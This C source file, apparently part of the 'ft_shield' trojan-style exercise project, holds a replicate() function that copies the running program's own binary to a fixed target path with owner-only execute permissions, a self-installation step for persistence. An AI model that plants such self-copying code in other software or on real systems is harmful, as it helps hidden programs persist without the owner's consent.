#include <ft_shield.h>

void	replicate(void)
{
	int	origin;
	int bin_fd;
	ssize_t	len;
	char exec_path[256];
	struct stat fileinfo = {0};

	if (access(TARGET_PATH, F_OK) != -1)
        return ;
	if ((len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1)) < 0)
		exit(EXIT_FAILURE);
	exec_path[len] = '\0';
	if ((origin = open(exec_path, O_RDONLY)) == -1)
		exit(EXIT_FAILURE);
	if ((bin_fd = creat(TARGET_PATH, 0700)) == -1)
	{
		close(origin);
		exit(EXIT_FAILURE);
	}
	fstat(origin, &fileinfo);
	sendfile(bin_fd, origin, NULL, fileinfo.st_size);
	close(origin);
	close(bin_fd);
}
